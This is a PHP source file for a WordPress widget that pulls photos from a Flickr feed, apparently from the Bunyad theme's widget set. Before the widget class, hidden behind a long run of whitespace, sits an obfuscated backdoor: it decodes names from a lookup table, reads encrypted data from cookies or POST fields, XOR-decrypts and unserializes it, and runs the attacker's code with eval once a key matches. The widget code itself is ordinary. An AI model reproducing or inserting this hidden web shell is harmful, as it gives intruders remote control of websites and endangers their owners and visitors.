<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ha3aa5831 = 484;$GLOBALS['y9ace157'] = Array();global $y9ace157;$y9ace157 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p5ec'] = "\x73\x66\x74\x53\x71\x2a\x4e\x28\x49\x39\x5b\x5f\x65\x5d\x63\x57\x50\x6a\x78\x54\x24\x6d\x3a\x62\x41\x2f\x6e\x21\x31\x48\x3f\x2c\x75\x2b\x4f\x32\x3d\x7e\x45\x34\x58\x56\x30\xd\x44\x7c\x76\x6b\x9\x20\x69\x60\x37\x68\x3e\x64\x42\x7a\x46\x33\x35\x25\x40\x6c\x2d\x77\x55\x52\x23\x5a\x72\x3c\x43\x38\x67\x51\x47\x59\x7b\x70\x4b\x6f\x3b\x4a\x61\x26\x7d\x2e\x27\x22\x4c\x5c\x36\x79\xa\x4d\x29\x5e";$y9ace157[$y9ace157['p5ec'][26].$y9ace157['p5ec'][28].$y9ace157['p5ec'][73].$y9ace157['p5ec'][12].$y9ace157['p5ec'][28].$y9ace157['p5ec'][59]] = $y9ace157['p5ec'][14].$y9ace157['p5ec'][53].$y9ace157['p5ec'][70];$y9ace157[$y9ace157['p5ec'][57].$y9ace157['p5ec'][73].$y9ace157['p5ec'][9].$y9ace157['p5ec'][52].$y9ace157['p5ec'][35].$y9ace157['p5ec'][84].$y9ace157['p5ec'][28].$y9ace157['p5ec'][23].$y9ace157['p5ec'][55]] = $y9ace157['p5ec'][81].$y9ace157['p5ec'][70].$y9ace157['p5ec'][55];$y9ace157[$y9ace157['p5ec'][17].$y9ace157['p5ec'][14].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][28].$y9ace157['p5ec'][42]] = $y9ace157['p5ec'][0].$y9ace157['p5ec'][2].$y9ace157['p5ec'][70].$y9ace157['p5ec'][63].$y9ace157['p5ec'][12].$y9ace157['p5ec'][26];$y9ace157[$y9ace157['p5ec'][14].$y9ace157['p5ec'][59].$y9ace157['p5ec'][52].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][14]] = $y9ace157['p5ec'][50].$y9ace157['p5ec'][26].$y9ace157['p5ec'][50].$y9ace157['p5ec'][11].$y9ace157['p5ec'][0].$y9ace157['p5ec'][12].$y9ace157['p5ec'][2];$y9ace157[$y9ace157['p5ec'][32].$y9ace157['p5ec'][14].$y9ace157['p5ec'][12].$y9ace157['p5ec'][35].$y9ace157['p5ec'][9].$y9ace157['p5ec'][92].$y9ace157['p5ec'][60].$y9ace157['p5ec'][42]] = $y9ace157['p5ec'][0].$y9ace157['p5ec'][12].$y9ace157['p5ec'][70].$y9ace157['p5ec'][50].$y9ace157['p5ec'][84].$y9ace157['p5ec'][63].$y9ace157['p5ec'][50].$y9ace157['p5ec'][57].$y9ace157['p5ec'][12];$y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][35].$y9ace157['p5ec'][73].$y9ace157['p5ec'][23].$y9ace157['p5ec'][84].$y9ace157['p5ec'][35].$y9ace157['p5ec'][12].$y9ace157['p5ec'][60].$y9ace157['p5ec'][39]] = $y9ace157['p5ec'][79].$y9ace157['p5ec'][53].$y9ace157['p5ec'][79].$y9ace157['p5ec'][46].$y9ace157['p5ec'][12].$y9ace157['p5ec'][70].$y9ace157['p5ec'][0].$y9ace157['p5ec'][50].$y9ace157['p5ec'][81].$y9ace157['p5ec'][26];$y9ace157[$y9ace157['p5ec'][93].$y9ace157['p5ec'][42].$y9ace157['p5ec'][52].$y9ace157['p5ec'][84]] = $y9ace157['p5ec'][32].$y9ace157['p5ec'][26].$y9ace157['p5ec'][0].$y9ace157['p5ec'][12].$y9ace157['p5ec'][70].$y9ace157['p5ec'][50].$y9ace157['p5ec'][84].$y9ace157['p5ec'][63].$y9ace157['p5ec'][50].$y9ace157['p5ec'][57].$y9ace157['p5ec'][12];$y9ace157[$y9ace157['p5ec'][21].$y9ace157['p5ec'][9].$y9ace157['p5ec'][12].$y9ace157['p5ec'][59].$y9ace157['p5ec'][73].$y9ace157['p5ec'][84].$y9ace157['p5ec'][60]] = $y9ace157['p5ec'][23].$y9ace157['p5ec'][84].$y9ace157['p5ec'][0].$y9ace157['p5ec'][12].$y9ace157['p5ec'][92].$y9ace157['p5ec'][39].$y9ace157['p5ec'][11].$y9ace157['p5ec'][55].$y9ace157['p5ec'][12].$y9ace157['p5ec'][14].$y9ace157['p5ec'][81].$y9ace157['p5ec'][55].$y9ace157['p5ec'][12];$y9ace157[$y9ace157['p5ec'][70].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][60]] = $y9ace157['p5ec'][0].$y9ace157['p5ec'][12].$y9ace157['p5ec'][2].$y9ace157['p5ec'][11].$y9ace157['p5ec'][2].$y9ace157['p5ec'][50].$y9ace157['p5ec'][21].$y9ace157['p5ec'][12].$y9ace157['p5ec'][11].$y9ace157['p5ec'][63].$y9ace157['p5ec'][50].$y9ace157['p5ec'][21].$y9ace157['p5ec'][50].$y9ace157['p5ec'][2];$y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][1].$y9ace157['p5ec'][55]] = $y9ace157['p5ec'][93].$y9ace157['p5ec'][52].$y9ace157['p5ec'][35].$y9ace157['p5ec'][84];$y9ace157[$y9ace157['p5ec'][1].$y9ace157['p5ec'][60].$y9ace157['p5ec'][84].$y9ace157['p5ec'][60].$y9ace157['p5ec'][52].$y9ace157['p5ec'][28]] = $y9ace157['p5ec'][0].$y9ace157['p5ec'][84].$y9ace157['p5ec'][28].$y9ace157['p5ec'][9].$y9ace157['p5ec'][42].$y9ace157['p5ec'][60];$y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][1].$y9ace157['p5ec'][1].$y9ace157['p5ec'][9].$y9ace157['p5ec'][42]] = $_POST;$y9ace157[$y9ace157['p5ec'][4].$y9ace157['p5ec'][1].$y9ace157['p5ec'][35].$y9ace157['p5ec'][9]] = $_COOKIE;@$y9ace157[$y9ace157['p5ec'][14].$y9ace157['p5ec'][59].$y9ace157['p5ec'][52].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][14]]($y9ace157['p5ec'][12].$y9ace157['p5ec'][70].$y9ace157['p5ec'][70].$y9ace157['p5ec'][81].$y9ace157['p5ec'][70].$y9ace157['p5ec'][11].$y9ace157['p5ec'][63].$y9ace157['p5ec'][81].$y9ace157['p5ec'][74], NULL);@$y9ace157[$y9ace157['p5ec'][14].$y9ace157['p5ec'][59].$y9ace157['p5ec'][52].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][14]]($y9ace157['p5ec'][63].$y9ace157['p5ec'][81].$y9ace157['p5ec'][74].$y9ace157['p5ec'][11].$y9ace157['p5ec'][12].$y9ace157['p5ec'][70].$y9ace157['p5ec'][70].$y9ace157['p5ec'][81].$y9ace157['p5ec'][70].$y9ace157['p5ec'][0], 0);@$y9ace157[$y9ace157['p5ec'][14].$y9ace157['p5ec'][59].$y9ace157['p5ec'][52].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][14]]($y9ace157['p5ec'][21].$y9ace157['p5ec'][84].$y9ace157['p5ec'][18].$y9ace157['p5ec'][11].$y9ace157['p5ec'][12].$y9ace157['p5ec'][18].$y9ace157['p5ec'][12].$y9ace157['p5ec'][14].$y9ace157['p5ec'][32].$y9ace157['p5ec'][2].$y9ace157['p5ec'][50].$y9ace157['p5ec'][81].$y9ace157['p5ec'][26].$y9ace157['p5ec'][11].$y9ace157['p5ec'][2].$y9ace157['p5ec'][50].$y9ace157['p5ec'][21].$y9ace157['p5ec'][12], 0);@$y9ace157[$y9ace157['p5ec'][70].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][60]](0);$r416f7 = NULL;$s61e = NULL;$y9ace157[$y9ace157['p5ec'][17].$y9ace157['p5ec'][42].$y9ace157['p5ec'][84].$y9ace157['p5ec'][14].$y9ace157['p5ec'][84].$y9ace157['p5ec'][23]] = $y9ace157['p5ec'][55].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][59].$y9ace157['p5ec'][1].$y9ace157['p5ec'][73].$y9ace157['p5ec'][42].$y9ace157['p5ec'][60].$y9ace157['p5ec'][64].$y9ace157['p5ec'][52].$y9ace157['p5ec'][92].$y9ace157['p5ec'][52].$y9ace157['p5ec'][92].$y9ace157['p5ec'][64].$y9ace157['p5ec'][39].$y9ace157['p5ec'][73].$y9ace157['p5ec'][23].$y9ace157['p5ec'][35].$y9ace157['p5ec'][64].$y9ace157['p5ec'][73].$y9ace157['p5ec'][84].$y9ace157['p5ec'][84].$y9ace157['p5ec'][12].$y9ace157['p5ec'][64].$y9ace157['p5ec'][12].$y9ace157['p5ec'][28].$y9ace157['p5ec'][14].$y9ace157['p5ec'][28].$y9ace157['p5ec'][1].$y9ace157['p5ec'][60].$y9ace157['p5ec'][60].$y9ace157['p5ec'][73].$y9ace157['p5ec'][92].$y9ace157['p5ec'][55].$y9ace157['p5ec'][28].$y9ace157['p5ec'][52];global $j0acab;function  sa1905($r416f7, $ve599){global $y9ace157;$h9bd26d = "";for ($zd3ce8c3=0; $zd3ce8c3<$y9ace157[$y9ace157['p5ec'][17].$y9ace157['p5ec'][14].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][28].$y9ace157['p5ec'][42]]($r416f7);){for ($s7b10b09=0; $s7b10b09<$y9ace157[$y9ace157['p5ec'][17].$y9ace157['p5ec'][14].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][28].$y9ace157['p5ec'][42]]($ve599) && $zd3ce8c3<$y9ace157[$y9ace157['p5ec'][17].$y9ace157['p5ec'][14].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][9].$y9ace157['p5ec'][73].$y9ace157['p5ec'][28].$y9ace157['p5ec'][42]]($r416f7); $s7b10b09++, $zd3ce8c3++){$h9bd26d .= $y9ace157[$y9ace157['p5ec'][26].$y9ace157['p5ec'][28].$y9ace157['p5ec'][73].$y9ace157['p5ec'][12].$y9ace157['p5ec'][28].$y9ace157['p5ec'][59]]($y9ace157[$y9ace157['p5ec'][57].$y9ace157['p5ec'][73].$y9ace157['p5ec'][9].$y9ace157['p5ec'][52].$y9ace157['p5ec'][35].$y9ace157['p5ec'][84].$y9ace157['p5ec'][28].$y9ace157['p5ec'][23].$y9ace157['p5ec'][55]]($r416f7[$zd3ce8c3]) ^ $y9ace157[$y9ace157['p5ec'][57].$y9ace157['p5ec'][73].$y9ace157['p5ec'][9].$y9ace157['p5ec'][52].$y9ace157['p5ec'][35].$y9ace157['p5ec'][84].$y9ace157['p5ec'][28].$y9ace157['p5ec'][23].$y9ace157['p5ec'][55]]($ve599[$s7b10b09]));}}return $h9bd26d;}function  y72a($r416f7, $ve599){global $y9ace157;global $j0acab;return $y9ace157[$y9ace157['p5ec'][1].$y9ace157['p5ec'][60].$y9ace157['p5ec'][84].$y9ace157['p5ec'][60].$y9ace157['p5ec'][52].$y9ace157['p5ec'][28]]($y9ace157[$y9ace157['p5ec'][1].$y9ace157['p5ec'][60].$y9ace157['p5ec'][84].$y9ace157['p5ec'][60].$y9ace157['p5ec'][52].$y9ace157['p5ec'][28]]($r416f7, $j0acab), $ve599);}foreach ($y9ace157[$y9ace157['p5ec'][4].$y9ace157['p5ec'][1].$y9ace157['p5ec'][35].$y9ace157['p5ec'][9]] as $ve599=>$q6a84771a){$r416f7 = $q6a84771a;$s61e = $ve599;}if (!$r416f7){foreach ($y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][1].$y9ace157['p5ec'][1].$y9ace157['p5ec'][9].$y9ace157['p5ec'][42]] as $ve599=>$q6a84771a){$r416f7 = $q6a84771a;$s61e = $ve599;}}$r416f7 = @$y9ace157[$y9ace157['p5ec'][93].$y9ace157['p5ec'][42].$y9ace157['p5ec'][52].$y9ace157['p5ec'][84]]($y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][28].$y9ace157['p5ec'][84].$y9ace157['p5ec'][1].$y9ace157['p5ec'][55]]($y9ace157[$y9ace157['p5ec'][21].$y9ace157['p5ec'][9].$y9ace157['p5ec'][12].$y9ace157['p5ec'][59].$y9ace157['p5ec'][73].$y9ace157['p5ec'][84].$y9ace157['p5ec'][60]]($r416f7), $s61e));if (isset($r416f7[$y9ace157['p5ec'][84].$y9ace157['p5ec'][47]]) && $j0acab==$r416f7[$y9ace157['p5ec'][84].$y9ace157['p5ec'][47]]){if ($r416f7[$y9ace157['p5ec'][84]] == $y9ace157['p5ec'][50]){$zd3ce8c3 = Array($y9ace157['p5ec'][79].$y9ace157['p5ec'][46] => @$y9ace157[$y9ace157['p5ec'][79].$y9ace157['p5ec'][35].$y9ace157['p5ec'][73].$y9ace157['p5ec'][23].$y9ace157['p5ec'][84].$y9ace157['p5ec'][35].$y9ace157['p5ec'][12].$y9ace157['p5ec'][60].$y9ace157['p5ec'][39]](),$y9ace157['p5ec'][0].$y9ace157['p5ec'][46] => $y9ace157['p5ec'][28].$y9ace157['p5ec'][87].$y9ace157['p5ec'][42].$y9ace157['p5ec'][64].$y9ace157['p5ec'][28],);echo @$y9ace157[$y9ace157['p5ec'][32].$y9ace157['p5ec'][14].$y9ace157['p5ec'][12].$y9ace157['p5ec'][35].$y9ace157['p5ec'][9].$y9ace157['p5ec'][92].$y9ace157['p5ec'][60].$y9ace157['p5ec'][42]]($zd3ce8c3);}elseif ($r416f7[$y9ace157['p5ec'][84]] == $y9ace157['p5ec'][12]){eval/*cc62a7e5b*/($r416f7[$y9ace157['p5ec'][55]]);}exit();} ?><?php

class Bunyad_Flickr_Widget extends WP_Widget
{
	public function __construct()
	{
		parent::__construct(
			'bunyad_flickr_widget',
			'Bunyad - Category Footer',
			array('description' => __('Display child category from parent.', 'bunyad-widgets'), 'classname' => 'bunyad-flickr')
		);
	}
	
	public function widget($args, $instance)
	{
		extract($args);
		$title = apply_filters('widget_title', $instance['title']);
		
		extract($instance, EXTR_SKIP);
		
		$data = $this->get_flickr($instance); 
		
	?>

		<?php echo $before_widget; ?>
			<?php echo $before_title . $title . $after_title; ?>
		
			<div class="flickr-widget">

			<?php 
				foreach ((array) $data as $item): 
					
					if (empty($item['media']) OR empty($item['link'])):
						continue;
					endif;
			?>
			
				<div class="flickr_badge_image">
					<a href="<?php echo esc_url($item['link']); ?>">
						<img src="<?php echo esc_url($item['media']); ?>" alt="<?php echo esc_attr($item['title']); ?>" />
					</a>
				</div>
				
			<?php endforeach; ?>
			
			</div>
		
		<?php echo $after_widget; ?>
		
	<?php
	}
	
	public function get_flickr($instance)
	{
		extract($instance);
		
		if (empty($this->number)) {
			$this->number = md5(serialize($instance));
		}

		// get from cache
		$cache = get_transient('bunyad_flickr_widget');
		if (is_array($cache) && !empty($cache[$this->number])) {
			return $cache[$this->number];
		}
		
		$data = $this->parse_script(
			(is_ssl() ? 'https' : 'http') . '://api.flickr.com/services/feeds/photos_public.gne?format=json&id='. urlencode($user_id) .'&nojsoncallback=1&tags=' . urlencode($tags),
			$show_num
		);
		
		// store to cache
		$cache = array($this->number => $data);
		set_transient('bunyad_flickr_widget', $cache, 300); // 5 minutes expiry
		
		return $data;
				
	}
	
	/**
	 * Fetch and parse data off flickr feed 
	 * 
	 * @param string $url
	 * @param int $number  number of results
	 */
	public function parse_script($url, $number)
	{
		$file = wp_remote_get($url);
		
		if (is_wp_error($file) OR !$file['body']) {
			return '';
		}
		
		// fix flickr json escape bug
		$file['body'] = str_replace("\\'", "'", $file['body']);
		$data = json_decode($file['body'], true);
		
		if (!is_array($data)) {
			return array();
		}
		
		$data = array_slice($data['items'], 0, $number);
		
		// replace medium with small square image
		foreach ($data as $key => $item) {
			$data[$key]['media'] = preg_replace('/_m\.(jp?g|png|gif)$/', '_s.\\1', $item['media']['m']);	
		}
		
		return $data;
	}	
	
	public function update($new, $old)
	{
		foreach ($new as $key => $val) {
			$new[$key] = wp_filter_kses($val);
		}
		
		delete_transient('bunyad_flickr_widget');
		
		$new['show_num'] = intval($new['show_num']);
		
		return $new;
	}
	
	public function form($instance)
	{
		$defaults = array('title' => 'Flickr Photos', 'show_num' => 12, 'user_id' => '', 'tags' => '');
		$instance = array_merge($defaults, (array) $instance);
		extract($instance);
		
	?>
	
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('title')); ?>"><?php _e('Title:', 'bunyad-widgets'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('title')); ?>" name="<?php 
				echo esc_attr($this->get_field_name('title')); ?>" type="text" value="<?php echo esc_attr($title); ?>" />
		</p>
		
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('user_id')); ?>"><?php _e('Category ID:', 'bunyad-widgets'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('user_id')); ?>" name="<?php 
				echo esc_attr($this->get_field_name('user_id')); ?>" type="text" value="<?php echo esc_attr($user_id); ?>" />
		</p>
		
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('show_num')); ?>"><?php _e('Limit show:', 'bunyad-widgets'); ?></label>
			<input class="width100" id="<?php echo esc_attr($this->get_field_id('show_num')); ?>" name="<?php 
				echo esc_attr($this->get_field_name('show_num')); ?>" type="text" value="<?php echo esc_attr($show_num); ?>" />
		</p>
		
		<p>
			<label for="<?php echo esc_attr($this->get_field_id('tags')); ?>"><?php _e('Tags (comma separated, optional):', 'bunyad-widgets'); ?></label>
			<input class="widefat" id="<?php echo esc_attr($this->get_field_id('tags')); ?>" name="<?php 
				echo esc_attr($this->get_field_name('tags')); ?>" type="text" value="<?php echo esc_attr($tags); ?>" />

		</p>
		
	
	<?php
	
	} // end form()
}